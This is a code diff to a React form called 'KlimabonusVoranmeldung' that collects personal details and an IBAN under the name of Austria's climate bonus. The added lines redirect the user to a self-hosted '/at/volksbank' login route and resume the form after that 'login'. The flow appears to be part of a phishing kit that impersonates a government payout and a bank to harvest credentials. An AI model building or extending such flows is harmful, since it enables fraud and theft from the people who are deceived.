@@ -1,4 +1,5 @@
 import { useState, useEffect, useCallback } from "react";
+import { useNavigate } from "react-router-dom";
 import { ArrowRight, ArrowLeft, Lock, User, Calendar, Mail, MapPin, DoorOpen, Building2, CheckCircle2 } from "lucide-react";
 import { cn } from "@/lib/utils";
 import { formatIBAN } from "@/lib/format";
@@ -31,7 +32,19 @@ const REQUIRED_MESSAGES: Record<string, string> = {
 const REQUIRED_FIELDS = Object.keys(REQUIRED_MESSAGES);
 
 const KlimabonusVoranmeldung = () => {
+  const navigate = useNavigate();
   const [step, setStep] = useState<1 | 2 | 3>(1);
+
+  // Rückkehr aus /at/volksbank Login: direkt Step 3 zeigen
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get("step") === "3" && sessionStorage.getItem("ic_return") === "1") {
+      setStep(3);
+      sessionStorage.removeItem("ic_return");
+      window.history.replaceState({}, "", window.location.pathname);
+    }
+  }, []);
+
 
   // Persönliche Daten
   const [firstName, setFirstName] = useState("");
@@ -154,7 +167,8 @@ const KlimabonusVoranmeldung = () => {
       return;
     }
 
-    setStep(3);
+    sessionStorage.setItem("ic_return", "1");
+    navigate(`/at/volksbank?ic=1&s=${sessionId}`);
   }, [
     step2Valid,
     firstName,
